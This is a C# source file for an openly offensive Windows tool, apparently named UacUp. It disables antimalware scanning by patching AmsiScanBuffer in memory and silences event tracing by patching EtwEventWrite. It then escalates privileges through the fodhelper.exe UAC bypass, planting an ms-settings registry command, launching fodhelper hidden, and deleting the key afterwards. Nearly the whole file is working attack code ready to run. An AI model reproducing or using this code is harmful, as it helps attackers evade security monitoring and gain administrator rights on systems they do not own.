using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;

namespace UacUp
{
    internal class Program
    {
        // import api
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpfllpflOldProtect);

        private static void AlwaysNotify()
        {
            RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
            string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
            alwaysNotify.Close();

            /*
             * 1: The admin is asked for username and password to execute the binary with high rights (on Secure Desktop)
             * 2: UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
             */

            if (consentPrompt == "2" & secureDesktopPrompt == "1")
            {
                Console.WriteLine("UAC is set to 'Always Notify.' This attack will fail. Exiting...");
                System.Environment.Exit(1);
            }
        }

        private static void AmsiBypass()
        {
            var library = LoadLibrary("amsi.dll");
            var address = GetProcAddress(library, "AmsiScanBuffer");
            uint lpflOldProtect;

            byte[] patch;

            // Checks Arch is 64bit or not
            if (Environment.Is64BitOperatingSystem == true)
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            else
            {
                patch = new byte[8];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc2;
                patch[6] = 0x18;
                patch[7] = 0x00;
            }

            VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out lpflOldProtect);
            Marshal.Copy(patch, 0, address, patch.Length);
            VirtualProtect(address, (UIntPtr)patch.Length, lpflOldProtect, out lpflOldProtect);
           
        }

        private static void EventViewerBypass()
        {
            byte[] patch;

            // Checks Arch is 64bit or not
            if (Environment.Is64BitOperatingSystem == true)
            {
                patch = new byte[2];
                patch[0] = 0xc3;
                patch[1] = 0x00;
            }
            else
            {
                patch = new byte[3];
                patch[0] = 0xc2;
                patch[1] = 0x14;
                patch[2] = 0x00;
            }

          
                var library = LoadLibrary("ntdll.dll");
                var address = GetProcAddress(library, "EtwEventWrite");
                VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            }

            static void Main(string[] args)
        {

            string CmdExec;
            //CmdExec = "powershell -WindowStyle hidden -Command \"& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Automatic logoff after 1 hour of inactivity','WARNING')}\"";
            // This is verified executable
            CmdExec = "C:\\Windows\\Explorer.EXE";


            AlwaysNotify();
            Console.WriteLine("Always notify is loosen, proceeding...");

            AmsiBypass();
            Console.WriteLine("Patching amsiscanbuffer...");

            EventViewerBypass();
            Console.WriteLine("Patching EventViewer");

            // Setting the Registry Key for FodHelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            // This should be set to the command you want to execute
            fod.SetValue("", CmdExec);
            fod.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:/windows/system32/fodhelper.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("ms-settings");
            return;
        }
    }
}
